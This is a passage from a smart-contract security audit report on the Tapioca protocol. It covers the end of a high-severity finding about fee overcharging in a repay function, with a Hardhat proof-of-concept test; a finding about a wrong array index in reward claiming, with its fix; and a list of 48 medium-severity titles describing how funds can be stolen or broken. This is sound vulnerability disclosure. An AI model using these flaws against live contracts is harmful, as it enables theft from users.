        yieldBox.withdraw(assetId, from, address(this), amount, 0);
        //burn USDO
        if (toBurn > 0) {
            IUSDOBase(address(asset)).burn(address(this), toBurn);
        }

        emit LogRepay(from, to, amount, part);
    }
```

The problem is that the function burns less than it should, hence, taking more fees than it should.

### Proof of Concept

I will provide a symbolic proof and coded proof to illustrate the issue. To show the issue clearly we will assume that there is no opening fee, and that the yearly fee is of 10%. Hence, for the coded PoC it is important to change the values of `bigBangEthDebtRate` and `borrowOpeningFee`:

```solidity
// Penrose contract
bigBangEthDebtRate = 1e17;

// BigBang contract
borrowOpeningFee;
```

### Symbolic

How much fees do the protocol should take?. The answer of this question can be represented in the following equation:

`ProtocolFees = CurrentUserDebt - OriginalUserDebt`

The fees accrued for the protocol is the difference of the current debt of the user and the original debt of the user. If we examine the implementation of the \_repay function we found the next:

```solidity
//uint256 amount;
(totalBorrow, amount) = totalBorrow.sub(part, true);
userBorrowPart[to] -= part;

uint256 toWithdraw = (amount - part); //acrrued
// @audit-issue Takes more fees than it should
uint256 toBurn = amount - toWithdraw;
yieldBox.withdraw(assetId, from, address(this), amount, 0);
//burn USDO
if (toBurn > 0) {
   IUSDOBase(address(asset)).burn(address(this), toBurn);
}
```

The important variables are:

*   1.  `part` represents the base part of the debt of the user
*   2.  `amount` is the elastic part that was paid giving `part`, elastic means this is the real debt.

At the following line the contract takes `amount` which is the real user debt from yield box:

```solidity
yieldBox.withdraw(assetId, from, address(this), amount, 0);
```

Then it burns some tokens:

```solidity
if (toBurn > 0) {
   IUSDOBase(address(asset)).burn(address(this), toBurn);
}
```

But how `toBurn` is calculated?:

```solidity
uint256 toWithdraw = (amount - part); //acrrued
uint256 toBurn = amount - toWithdraw;
```

`toBurn` is just `part`. Hence, the contract is computing the fees as:

`ProtocolFees = amount - part`. Rewriting this with the first equation terms will be:

`ProtocolFees = CurrentDebt - part`.

But it is `part` equal to `OriginalDebt`?. Remember that `part` is not the actual debt, is just the part of the real debt to be paid, this can be found in a comment in the code:

```solidity
elastic = Total token amount to be repayed by borrowers, base = Total parts of the debt held by borrowers.
```

So they are equal only for the first borrower, but for the others this wont be the case since the relation of `elastic` and `part` wont be 1:1 due to accrued fees, making `part < OriginalDebt`, and hence the protocol taking more fees. Let's use some number to showcase it better:

    TIME = 0

    First borrower A asks 1,000 units, state:

    part[A] = 1000
    total.part = 1000
    total.elastic = 1000


    TIME = 1 YEAR

    part[A] = 1000 --> no change from borrower A
    total.part = 1000 --> no change yet 
    total.elastic = 1100 --> fees accrued in one year 100 units

    Second borrower B asks 1,000 units, state:

    part[B] = 909.09
    total.part = 1909.09
    total.elastic = 2100

    B part was computed as:

    1000 * 1000 / 1100 = 909.09

    TIME = 2 YEAR

    Fees are accrued, hence:

    total.elastic = 2100 * 1.1 = 2310.

    Hence the total fees accrued by the protocol are:

    2310 - 2000 = 310.

    These 310 are collected from A and B in the following proportions:

    A Fee = 210
    B Fee = 100

    Borrower B produced 100 units of fees, which makes sense, he asked for 1000 units at 10%/year. 

When B repays its debt, he needs to repay 1,100 units. Then the contract burns the proportion that was real debt, the problem as stated above is that the function burns the `part` and not the original debt, hence the contract will burn 909.09 units. Hence it took:

1100 - 909.09 = 190.91 units

The contract took 190.91 in fees rather than 100 units.

### Coded PoC

Follow the next steps to run the coded PoC:

*   1.- Make the contract changes described at the beginning.

*   2.- Add the following test under `test/bigBang.test.ts`:

<details>

```typescript
describe.only('borrow() & repay() check fees', () => {
        it('should borrow and repay check fees', async () => {
            const {
                wethBigBangMarket,
                weth,
                wethAssetId,
                yieldBox,
                deployer,
                bar,
                usd0,
                __wethUsdcPrice,
                timeTravel,
                eoa1,
            } = await loadFixture(register);

            await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

            await weth
                .connect(eoa1)
                .approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox
                .connect(eoa1)
                .setApprovalForAll(wethBigBangMarket.address, true);

            const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
                10,
            );
            await weth.freeMint(wethMintVal);
            await weth.connect(eoa1).freeMint(wethMintVal);

            const valShare = await yieldBox.toShare(
                wethAssetId,
                wethMintVal,
                false,
            );
            await yieldBox.depositAsset(
                wethAssetId,
                deployer.address,
                deployer.address,
                0,
                valShare,
            );
            await wethBigBangMarket.addCollateral(
                deployer.address,
                deployer.address,
                false,
                0,
                valShare,
            );

            await yieldBox
                .connect(eoa1)
                .depositAsset(
                    wethAssetId,
                    eoa1.address,
                    eoa1.address,
                    0,
                    valShare,
                );
            await wethBigBangMarket
                .connect(eoa1)
                .addCollateral(eoa1.address, eoa1.address, false, 0, valShare);

            //borrow
            const usdoBorrowVal = wethMintVal
                .mul(10)
                .div(100)
                .mul(__wethUsdcPrice.div((1e18).toString()));

            await wethBigBangMarket.borrow(
                deployer.address,
                deployer.address,
                usdoBorrowVal,
            );

            const userBorrowPart = await wethBigBangMarket.userBorrowPart(
                deployer.address,
            );

            console.log('User A Borrow Part: ' + userBorrowPart);

            timeTravel(365 * 86400);

            await wethBigBangMarket
                .connect(eoa1)
                .borrow(eoa1.address, eoa1.address, usdoBorrowVal);

            timeTravel(365 * 86400);

            const eoa1BorrowPart = await wethBigBangMarket.userBorrowPart(
                eoa1.address,
            );

            console.log('User B Borrow Part: ' + eoa1BorrowPart);

            const usd0Extra = ethers.BigNumber.from((1e18).toString()).mul(500);
            await usd0.mint(eoa1.address, usd0Extra);
            await usd0.connect(eoa1).approve(yieldBox.address, usd0Extra);
            await yieldBox
                .connect(eoa1)
                .depositAsset(
                    await wethBigBangMarket.assetId(),
                    eoa1.address,
                    eoa1.address,
                    usd0Extra,
                    0,
                );

            const contractusdoB1 = await usd0.balanceOf(
                wethBigBangMarket.address,
            );

            console.log('Fees before repayment: ' + contractusdoB1);

            // Repayment happens
            await wethBigBangMarket
                .connect(eoa1)
                .repay(eoa1.address, eoa1.address, false, eoa1BorrowPart);

            const userBorrowPartAfter = await wethBigBangMarket.userBorrowPart(
                eoa1.address,
            );

            // User paid all its debt.
            expect(userBorrowPartAfter.eq(0)).to.be.true;

            const contractusdoB2 = await usd0.balanceOf(
                wethBigBangMarket.address,
            );

            console.log('Fees after repayment: ' + contractusdoB2);
        });
    });
```

</details>

### Tools Used

Hardhat

### Recommended Mitigation Steps

Not only store the user borrow part but also the original debt which is `debtAsked + openingFee`. So, during repayment the contract can compute the real fees generated.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/87#issuecomment-1677536854)**

***

## [[H-60] twTAP.claimAndSendRewards() will claim the wrong amount for each reward token due to the use of wrong index](https://github.com/code-423n4/2023-07-tapioca-findings/issues/41)
*Submitted by [chaduke](https://github.com/code-423n4/2023-07-tapioca-findings/issues/41), also found by [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1305), [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1091), [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1062), and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/172)*

Detailed description of the impact of this finding.
twTAP.claimAndSendRewards() will claim the wrong amount for each reward token due to the use of wrong index. As a result, some users will lose some rewards and others will claim more rewards then they deserve.

### Proof of Concept

Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

twTAP.claimAndSendRewards() allows the tapOFT to claim and send a list of rewards indicated in `_rewardTokens`.

<https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L361-L367>

It calls the function `  _claimRewardsOn() ` to achieve this:

<https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L499-L519>

Unfortunately, at L509, it uses the index of `i` instead of the correct index of `claimableIndex`. As a result, the amount that is claimed and transferred for each reward is wrong.

### Tools Used

VSCode

### Recommended Mitigation Steps

We need to use index `claimableIndex` instead of `i` for function `  _claimRewardsOn() `:

```diff
function _claimRewardsOn(
        uint256 _tokenId,
        address _to,
        IERC20[] memory _rewardTokens
    ) internal {
        uint256[] memory amounts = claimable(_tokenId);
        unchecked {
            uint256 len = _rewardTokens.length;
            for (uint256 i = 0; i < len; ) {
                uint256 claimableIndex = rewardTokenIndex[_rewardTokens[i]];
-                uint256 amount = amounts[i];
+                uint256 amount = amounts[claimableIndex];

                if (amount > 0) {
                    // Math is safe: `amount` calculated safely in `claimable()`
                    claimed[_tokenId][claimableIndex] += amount;
                    rewardTokens[claimableIndex].safeTransfer(_to, amount);
                }
                ++i;
            }
        }
    }
```
**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/41#issuecomment-1674931674)**

***

# Medium Risk Findings (99)
### [[M-01] `getDebtRate()` is view and reads `ethMarket.getTotalDebt` allowing for manipulations](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1561)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1561)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1561#issuecomment-1707907991)
***

### [[M-02] Single UniswapV3Swapper using a single fee makes it highly likely to be suboptimal](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1553)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1553) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+is%3Aclosed+label%3Aduplicate-1553) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1553#issuecomment-1812943988)
***

### [[M-03] `StargateStrategy#_currentBalance` calculation is incorrect and may lead to DoS](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1520)
*Submitted by [Madalad](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1520), also found by [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1326)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1520#issuecomment-1707896229)
***

### [[M-04] `StargateStrategy#_withdraw`: ether becomes trapped in the contract whenever a user withdraws](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1519)
*Submitted by [Madalad](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1519)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1519#issuecomment-1707888817)
***

### [[M-05] `MagnetarV2#burst` double counts `msg.value` for `TOFT_WRAP` operation, making the transaction revert unless the user overpays](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1504)
*Submitted by [Madalad](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1504) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+is%3Aclosed+label%3Aduplicate-1504) submitted by additional wardens)*<br>
Status: [Sponsor Confirmed via duplicate issue 207](https://github.com/code-423n4/2023-07-tapioca-findings/issues/207)
***

### [[M-06] Oracle is susceptible to manipulation if deployed on Optimism](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1474)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1474), also found by [0xSmartContract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/112)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1474#issuecomment-1703108138)
***

### [[M-07] `YearnStrategy` is ignoring the `lockedProfits`, giving away all of the Yield to laggard depositors](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1459)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1459)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1459#issuecomment-1707871352)
***

### [[M-08] In case of Loss to the Yearn Vault, the Contract will stop working until the loss is repaid](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1456)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1456) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+is%3Aclosed+label%3Aduplicate-1456) submitted by additional wardens)*<br>
Status: [Sponsor Confirmed via duplicate issue 96](https://github.com/code-423n4/2023-07-tapioca-findings/issues/96)
***

### [[M-09] LidoETHStrategy buys stETH at 1-1 instead of buying it from the Pool at Discount](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1437)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1437)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1437#issuecomment-1707868274)
***

### [[M-10] LidEthStrategys Hardcoded 2.5% slippage allows stealing all tokens above &#36;2MLN](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1430)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1430)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1430#issuecomment-1812946036)
***

### [[M-11] Curve Strategy Yield can be Lost by Griefing due to Delta Balance Check](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1429)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1429)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1429#issuecomment-1707866580)
***

### [[M-12] Convex `BaseRewardPool` allows Claim on Behalf which causes delta to break - Loss of all Rewards](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1425)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1425), also found by [minhtrng](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1688)*<br>
Status: [Sponsor Confirmed via duplicate issue 1688](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1688)
***

### [[M-13] Missing deadline checks allow pending transactions to be maliciously executed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1408)
*Submitted by [Sathish9098](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1408) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1408+is%3Aclosed+label%3Asatisfactory) submitted by additional wardens)*<br>
Status: [Sponsor Confirmed via duplicate issue 1513](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1513)
***

### [[M-14] `exitPositionAndRemoveCollateral()` will fail as `MagnetarV2` does not implement `onERC721Received()`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1405)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1405)*<br>
Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1405#issuecomment-1699368448)
***

### [[M-15] `multiHopSell` and `multiHopBuy` can be frontrunned with high slippage tolerance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1368)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1368)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1368#issuecomment-1695924047)
***

### [[M-16] `TapiocaOptionLiquidityProvision.registerSingularity()` not checking for duplicate assetIds leading to multiple issues](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1350)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1350)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1350#issuecomment-1812949578)
***

### [[M-17]  Incorrect accounting for yieldBoxShares in SGLLiquidation results in wrongly read values](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1349)
*Submitted by [unsafesol](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1349)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1349#issuecomment-1693875682)
***

### [[M-18] User could be forced to withdraw more amount than desired when calling `retrieveFromStrategy`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1346)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1346)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1346#issuecomment-1693745035)
***

### [[M-19] token mights stuck in MagnetarMarketModule contract if the asset doesn't support cross-chain operation](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1336)
*Submitted by [jasonxiale](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1336), also found by [Madalad](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1503)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1336#issuecomment-1693725738)
***

### [[M-20] Tricrypto on arbitrum should not be used as collateral due to virtual_price manipulation due to Vyper 2.15, .16 and 3.0 bug](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1333)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1333), also found by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1018)*<br>
Status: [Sponsor Acknowledged](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1333#issuecomment-1703035667)
***

### [[M-21] CompoundStrategy `_currentBalance` uses `exchangeRateStored` which is leaks value](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1330)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1330) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1330+is%3Aclosed+) submitted by additional wardens)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1330#issuecomment-1693723846)
***

### [[M-22]  MEV Attack on `stkAAVE` causes the AaveStrategy to give away all of the Yield](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1321)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1321)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1321#issuecomment-1693676205)
***

### [[M-23] Airdropped tokens can be stolen by a bot](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1300)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1300)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1300#issuecomment-1693675115)
***

### [[M-24] Cannot use CurveSwapper when calling compound due to mismatched data parameter](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1280)
*Submitted by [ayeslick](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1280)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1280#issuecomment-1693667924)
***

### [[M-25] Using `setBigBangEthMarketDebtRate` or `setBigBangConfig` cause incorrect interest calculation due to retroactively applying the interest rate](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1277)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1277), also found by rvierdiiev ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/123), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/120))*<br>
Status: [Sponsor Confirmed via duplicate issue 120](https://github.com/code-423n4/2023-07-tapioca-findings/issues/120)
***

### [[M-26] Burning FlashFee breaks a core protocol invariant](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1276)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1276), also found by [jaraxxus](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1256)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1276#issuecomment-1693658327)
***

### [[M-27] Multihop buying and selling of collateral will fail due to missing gas payment](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1264)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1264)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1264#issuecomment-1693568193)
***

### [[M-28] TOFT `exerciseOption` fails due to not passing `msg.value` properly](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1248)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1248) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1248+is%3Aclosed+) submitted by additional wardens)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1248#issuecomment-1813292243)
***

### [[M-29] `TapiocaOptionLiquidityProvision` stores amount which cause Socialization of Loss when unlocking](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1247)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1247)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1247#issuecomment-1814742545)
***

### [[M-30] `TapiocaOptionLiquidityProvision` causes Loss of Yield when depositing and withdrawing from Singularity - should use shares to track balances](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1246)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1246) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1246+is%3Aclosed+) submitted by additional wardens)*<br>
Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1246#issuecomment-1693566242)
***

### [[M-31] `extractTAP()` function can allow minting an infinite amount in one week, leading to a DoS attack in `emitForWeek()`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1241)
*Submitted by [mojito\_auditor](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1241) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1241+is%3Aclosed+) submitted by additional wardens)* <br>
Status: [Sponsor Confirmed via duplicate issue 728](https://github.com/code-423n4/2023-07-tapioca-findings/issues/728)
***

### [[M-32] YearnStrategy rounding down when calculating `toWithdraw` could result in insufficient withdrawal amount](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1239)
*Submitted by [mojito\_auditor](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1239)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1239#issuecomment-1707789791)
***

### [[M-33] `emitForWeek` will lose `emissionForWeek` if one week is skipped](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1218)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1218) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1218+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 549](https://github.com/code-423n4/2023-07-tapioca-findings/issues/549)
***

### [[M-34] `BaseTOFT.sendToYBAndBorrow()` will fail when withdrawing the borrowed asset to another chain](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1212)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1212)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1212#issuecomment-1692491844)
***

### [[M-35] `ARBTriCryptoOracle` is vulnerable to read-only reentrancy](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1211)
*Submitted by [IllIllI](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1211) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1211+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Acknowledged via duplicate issue 704](https://github.com/code-423n4/2023-07-tapioca-findings/issues/704)
***

### [[M-36] `BaseTOFTSTrategyModule.strategyWithdraw()` cross chain call will fail due to missing approvals](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1209)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1209) also found by [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/759)*<br>
Status: [Sponsor Confirmed via duplicate issue 759](https://github.com/code-423n4/2023-07-tapioca-findings/issues/759)
***

### [[M-37] Seer.get uses a view fetcher, breaking the intended use](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1184)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1184)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1184#issuecomment-1699310651)
***

### [[M-38] Incorrect `eligibleAmount` for `AirdropBroker` Phase 3](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1175)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1175), (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1175+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 173](https://github.com/code-423n4/2023-07-tapioca-findings/issues/173)
***

### [[M-39] Incorrect refund address for `BaseTOFT.retrieveFromStrategy()` prevents gas refund to user](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1174)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1174)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1174#issuecomment-1702905446)
***

### [[M-40] BigBang and Singularity should not pause repay() and liquidate()](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1169)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1169) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1169+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1169#issuecomment-1702885083)
***

### [[M-41] Tapioca Bar: Unusable Market Add Functions in Penrose Contract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1158)
*Submitted by [Limbooo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1158) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1158+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 79](https://github.com/code-423n4/2023-07-tapioca-findings/issues/79)
***

### [[M-42] BigBang liquidation share is not distributed 100%](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1139)
*Submitted by [plainshift](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1139) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1139+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1139#issuecomment-1699290364)
***

### [[M-43] `_getInterestRate` function in SGLCommon contract accrues incorrect fee](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1120)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1120)*
<br>Status: [Disputed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1120#issuecomment-1692363598)
***

### [[M-44] SGLLeverage/BigBang `buyCollateral` Can Be Exploited to Steal Asset Approvals & Collateral](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1086)
*Submitted by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1086) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1086+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Disputed via duplicate issue 147](https://github.com/code-423n4/2023-07-tapioca-findings/issues/147)
***

### [[M-45] Users can borrow funds without any allowance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1061)
*Submitted by [BPZ](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1061)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1061#issuecomment-1701864138)
***

### [[M-46] `totalCollateralShare` state variable not updated in `Singularity` market upon liquidation, resulting in an error on `addCollateral` with skim functionality](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1040)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1040) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-1040+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1040#issuecomment-1691811988)
***

### [[M-47] `BaseTOFTMarketModule.sol`: `removeCollateral` removes collateral from the wrong account](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1033)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1033)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1033#issuecomment-1701695585)
***

### [[M-48] liquidation will fail if the Seer or Oracle reverts instead of returning false](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1026)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1026)*
<br>Status: [Sponsor Confirmed via duplicate issue 34](https://github.com/code-423n4/2023-07-tapioca-findings/issues/34)
***

